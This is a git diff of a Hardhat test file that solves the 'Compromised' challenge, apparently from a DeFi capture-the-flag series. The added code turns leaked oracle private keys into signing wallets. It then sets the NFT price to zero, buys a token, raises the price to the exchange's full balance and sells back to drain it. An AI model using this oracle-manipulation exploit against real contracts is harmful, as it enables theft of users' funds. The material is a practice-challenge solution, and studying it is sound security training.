@@ -86,10 +86,23 @@ describe("Compromised challenge", function () {
         });
         [deployer, attacker] = await ethers.getSigners();
 
-        const oracleWallets = leakedData.map(key => new ethers.VoidSigner(key));
-        console.log(this.oracle.signer)
-        console.log(this.oracle.connect(oracleWallets[0]).signer)
-        //await this.oracle.connect(oracleWallets[1]).postPrice('DVNFT', 0);
+        const postPrice = async (price, oracleWallets) => {
+            await this.oracle.connect(oracleWallets[0]).postPrice("DVNFT", price);
+            await this.oracle.connect(oracleWallets[1]).postPrice("DVNFT", price);
+        };
+
+        const oracleWallets = leakedData.map((key) =>
+            new ethers.Wallet(key).connect(ethers.provider)
+        );
+
+        await postPrice(0, oracleWallets);
+        const tokenId = (await this.exchange.connect(attacker).buyOne({value: 1})).value;
+        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await postPrice(exchangeBalance.toString(), oracleWallets);
+        await this.exchange.connect(attacker).sellOne(0);
+        await postPrice(ethers.utils.parseEther('999'), oracleWallets);
     });
 
     after(async function () {
